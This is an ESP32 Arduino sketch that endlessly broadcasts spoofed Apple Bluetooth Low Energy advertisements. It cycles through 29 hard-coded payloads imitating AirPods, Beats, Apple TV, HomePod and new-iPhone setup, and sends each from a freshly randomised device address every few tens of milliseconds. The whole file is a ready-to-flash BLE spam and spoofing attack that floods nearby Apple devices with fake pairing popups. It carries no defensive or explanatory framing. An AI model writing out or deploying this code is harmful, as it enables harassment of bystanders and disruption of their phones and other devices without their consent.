
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>

BLEAdvertising *pAdvertising;  

int deviceType; 
int delayMileSeconds = 8;

void setup() {
  randomSeed(micros());
  
  Serial.begin(115200);
  Serial.println("Starting ESP32 BLE");

  BLEDevice::init("");

  BLEServer *pServer = BLEDevice::createServer();

  pAdvertising = pServer->getAdvertising();
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
}

void loop() {
  while (1) {  // Infinite loop
    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
    deviceType = random(1, 30);
uint8_t* data;
switch(deviceType) {
  case 1:{
  uint8_t dataAirpods[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    data = dataAirpods;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataAirpods)));
    break;
}
  case 2:{
   uint8_t dataAirpodsPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    data = dataAirpodsPro;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataAirpodsPro)));
    break;
}
  case 3:{
  uint8_t dataAirpodsMax[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    data = dataAirpodsMax;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataAirpodsMax)));
    break;
}
  case 4:{
  uint8_t dataAirpodsGen2[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    data = dataAirpodsGen2;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataAirpodsGen2)));
    break;
}
  case 5:{
  uint8_t dataAirpodsGen3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    data = dataAirpodsGen3;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataAirpodsGen3)));
    break;
}
  case 6:{
  uint8_t dataAirpodsProGen2[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    data = dataAirpodsProGen2;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataAirpodsProGen2)));
    break;
}
  case 7:{
   uint8_t dataPowerBeats[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    data = dataPowerBeats;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataPowerBeats)));
    break;
}
  case 8:{
    uint8_t dataPowerBeatsPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    data = dataPowerBeatsPro;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataPowerBeatsPro)));
    break;
}
  case 9:{
  uint8_t dataBeatsSoloPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    data = dataBeatsSoloPro;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataBeatsSoloPro)));
    break;
}
  case 10:{
   uint8_t dataBeatsStudioBuds[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    data = dataBeatsStudioBuds;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataBeatsStudioBuds)));
    break;
}
  case 11:{
   uint8_t dataBeatsFlex[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; 
    data = dataBeatsFlex;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataBeatsFlex)));
    break;
}
  case 12:{
    uint8_t dataBeatsX[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    data = dataBeatsX;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataBeatsX)));
    break;
}
  case 13:{
    uint8_t dataBeatsSolo3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    data = dataBeatsSolo3;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataBeatsSolo3)));
    break;
}
  case 14:{
    uint8_t dataBeatsStudio3[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    data = dataBeatsStudio3;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataBeatsStudio3)));
    break;
}
  case 15:{
    uint8_t dataBeatsStudioPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    data = dataBeatsStudioPro;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataBeatsStudioPro)));
    break;
}
  case 16:{
  uint8_t dataBeatsFitPro[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    data = dataBeatsFitPro;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataBeatsFitPro)));
    break;
}
  case 17:{
    uint8_t dataBeatsStudioBudsPlus[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    data = dataBeatsStudioBudsPlus;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataBeatsStudioBudsPlus)));
    break;
}
  case 18:{
    uint8_t dataAppleTVSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
    data = dataAppleTVSetup;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataAppleTVSetup)));
    break;
}
  case 19:{
   uint8_t dataAppleTVPair[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
    data = dataAppleTVPair;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataAppleTVPair)));
    break;
}
  case 20:{
    uint8_t dataAppleTVNewUser[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
    data = dataAppleTVNewUser;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataAppleTVNewUser)));
    break;
}
  case 21:{
    uint8_t dataAppleTVAppleIDSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
    data = dataAppleTVAppleIDSetup;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataAppleTVAppleIDSetup)));
    break;
}
  case 22:{
    uint8_t dataAppleTVWirelessAudioSync[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
    data = dataAppleTVWirelessAudioSync;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataAppleTVWirelessAudioSync)));
    break;
}
  case 23:{
    uint8_t dataAppleTVHomekitSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
    data = dataAppleTVHomekitSetup;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataAppleTVHomekitSetup)));
    break;
}
  case 24:{
    uint8_t dataAppleTVKeyboard[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
    data = dataAppleTVKeyboard;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataAppleTVKeyboard)));
    break;
}
  case 25:{
    uint8_t dataAppleTVConnectingToNetwork[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
    data = dataAppleTVConnectingToNetwork;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataAppleTVConnectingToNetwork)));
    break;
}
  case 26:{
      uint8_t dataHomepodSetup[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
    data = dataHomepodSetup;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataHomepodSetup)));
    break;
}
    case 27:
 {   
  uint8_t dataSetupNewPhone[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
    data = dataSetupNewPhone;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataSetupNewPhone)));
    break;
}
    case 28:{
      uint8_t dataTransferNumber[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
    data = dataTransferNumber;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataTransferNumber)));
    break;
}
    case 29: {
  uint8_t dataTVColorBalance[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
    data = dataTVColorBalance;
    oAdvertisementData.addData(std::string((char*)data, sizeof(dataTVColorBalance)));
    break; 
    }
}
  
  esp_bd_addr_t random_addr;
  for (int i = 0; i < 6; i++) {
    random_addr[i] = random(256);
  }
  pAdvertising->setDeviceAddress(random_addr, BLE_ADDR_TYPE_RANDOM);
  pAdvertising->setAdvertisementData(oAdvertisementData);
    
    Serial.println("Sending Advertisement...");
    pAdvertising->start();
    delay(delayMileSeconds * 10); 
    pAdvertising->stop();
    
  }
}
